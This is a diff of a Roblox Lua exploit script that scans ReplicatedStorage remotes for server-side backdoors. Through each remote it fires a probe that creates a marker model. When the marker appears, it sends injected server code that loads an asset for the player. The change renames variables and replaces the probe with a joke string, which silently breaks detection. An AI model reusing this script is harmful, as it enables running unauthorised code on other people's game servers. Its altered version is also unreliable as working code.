@@ -1,5 +1,5 @@
-local modelName = "skibidihawkexecutormodelv2"
-local backdoor = nil
+local modelName = "sptzyy"
+local zyy = nil
 local lastFired = nil
 
 for _, obj in ipairs(workspace:GetChildren()) do
@@ -9,14 +9,14 @@ for _, obj in ipairs(workspace:GetChildren()) do
 end
 
 workspace.ChildAdded:Connect(function(child)
-	if child.Name == modelName and backdoor == nil then
-		backdoor = lastFired
-		print("Found backdoor!")
+	if child.Name == modelName and zyy == nil then
+		zyy = lastFired
+		print("Found zyy!")
 	end
 end)
 
 local payload = [[
-	Instance.new("Model", workspace).Name = "skibidihawkexecutormodelv2"
+	sorry bos ke hack😂
 ]]
 
 for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
@@ -31,7 +31,7 @@ end
 
 task.wait(0.5)
 
-if backdoor and typeof(backdoor) == "Instance" then
+if zyy and typeof(zyy) == "Instance" then
 	local playerName = game.Players.LocalPlayer.Name
 	local insertPayload = [[
 		local player = game.Players:FindFirstChild("]] .. playerName .. [[")
@@ -44,11 +44,11 @@ if backdoor and typeof(backdoor) == "Instance" then
 			asset:Destroy()
 		end
 	]]
-	backdoor:FireServer(insertPayload)
+	zyy:FireServer(insertPayload)
 else
 	game:GetService("StarterGui"):SetCore("SendNotification", {
 		Title = "sptzyy",
-		Text = "no backdoor found :c so ui cant load. sry :(",
+		Text = ":(",
 		Icon = "",
 		Duration = 5,
 	})
